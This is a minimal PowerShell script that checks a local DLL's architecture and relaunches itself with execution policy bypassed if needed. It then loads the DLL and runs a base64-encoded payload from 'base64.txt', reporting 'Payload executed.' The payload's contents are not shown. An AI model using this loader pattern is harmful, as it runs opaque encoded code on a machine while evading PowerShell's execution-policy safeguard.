﻿# 1.ps1 — минимальный PS-скрипт

$ErrorActionPreference = 'Stop'

$dllPath = (Resolve-Path ".\Company.SafeIngest.dll").Path
$dllBytes = [System.IO.File]::ReadAllBytes($dllPath)

function Get-PEArch {
    param([byte[]]$Bytes)
    $e_lfanew = [BitConverter]::ToInt32($Bytes, 0x3C)
    $magic = [BitConverter]::ToUInt16($Bytes, $e_lfanew + 0x18)
    switch ($magic) { 0x10B { "x86" } 0x20B { "x64" } default { "unknown" } }
}

$dllArch = Get-PEArch $dllBytes
$is64 = [Environment]::Is64BitProcess

if ($dllArch -eq "x86" -and $is64) {
    & "$env:WINDIR\SysWOW64\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -ExecutionPolicy Bypass -File $PSCommandPath
    exit
}
elseif ($dllArch -eq "x64" -and -not $is64) {
    & "$env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -ExecutionPolicy Bypass -File $PSCommandPath
    exit
}

Add-Type -Path $dllPath -ErrorAction Stop
$instance = New-Object Company.SafeIngest.SafeIngest
$instance.RunBase64File((Resolve-Path ".\base64.txt").Path)
Write-Host "✅ Payload executed."
